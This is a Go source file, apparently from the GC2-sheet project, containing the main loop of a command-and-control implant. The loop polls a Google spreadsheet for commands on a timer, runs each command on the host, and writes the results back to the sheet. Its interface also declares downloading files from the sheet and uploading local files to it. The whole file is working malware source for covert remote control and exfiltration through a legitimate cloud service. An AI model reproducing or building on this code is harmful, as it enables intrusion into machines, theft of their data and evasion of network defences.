package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"time"
)

type C2Operations interface {
	// Retrieve command and ticker from remote spreadsheet
	pullCommandAndTicker() (string, int)

	// Push configuration.Commands output to remote spreadsheet
	pushOutput(*configuration.Commands)

	// Download a file, returns file content and error if any
	pullFile(fileId string) ([]byte, error)

	// Local path of the file to push, return error if any
	pushFile(string) error

	// Return last command from the Sheet.CommandsExecution pool array
	getLastCommand() *configuration.Commands

	// Add new *configuration.Commands to the Sheet.CommandsExecution pool array
	addCommandToPool(*configuration.Commands)
}

func C2Init() {

	GAuth := GoogleInit()

	Run(GAuth)

}

func Run(c2 C2Operations) {

	// Creating the first command
	c2.addCommandToPool(createEmptyCommand(c2.getLastCommand()))

	// Creating ticker
	ticker := time.NewTicker(time.Duration(configuration.DefaultTickerDuration) * time.Second)

	for {
		select {
		case <-ticker.C:
			go func() {
				// Get last command in the pool
				lastCommand := c2.getLastCommand()

				commandToExecute := ""

				// If last command has empty Input we need to get the new command from the spreadsheet
				if lastCommand.Input == "" {
					// command to execute (can be ""), and delay for the ticker
					newTicker := configuration.DefaultTickerDuration
					commandToExecute, newTicker = c2.pullCommandAndTicker()

					// Update ticker if value has changed
					utils.LogDebug("Updated ticker delay")
					ticker.Reset(time.Duration(newTicker) * time.Second)
				}

				// If no command end the thread
				if commandToExecute == "" {
					utils.LogDebug("No new command")
					return
				}

				utils.LogDebug("New command: " + commandToExecute)

				// Set new retrieved command
				lastCommand.Input = commandToExecute

				// Create new empty command before performing the current one (to avoid deadlock on command execution)
				c2.addCommandToPool(createEmptyCommand(c2.getLastCommand()))

				// Execute the command
				commandExecution(c2, lastCommand)

				// Write result on spreadsheet (result is stored in the current command structure)
				c2.pushOutput(lastCommand)

			}()
		}
	}

}

func createEmptyCommand(lastCommand *configuration.Commands) *configuration.Commands {

	if lastCommand == nil {
		return &configuration.Commands{
			RangeIn:  "A",
			RangeOut: "B",
			RangeLog: "C",
			RangeId:  1,
			Input:    "",
			Output:   "",
		}
	} else {
		return &configuration.Commands{
			RangeIn:  "A",
			RangeOut: "B",
			RangeLog: "C",
			RangeId:  lastCommand.RangeId + 1,
			Input:    "",
			Output:   "",
		}
	}
}
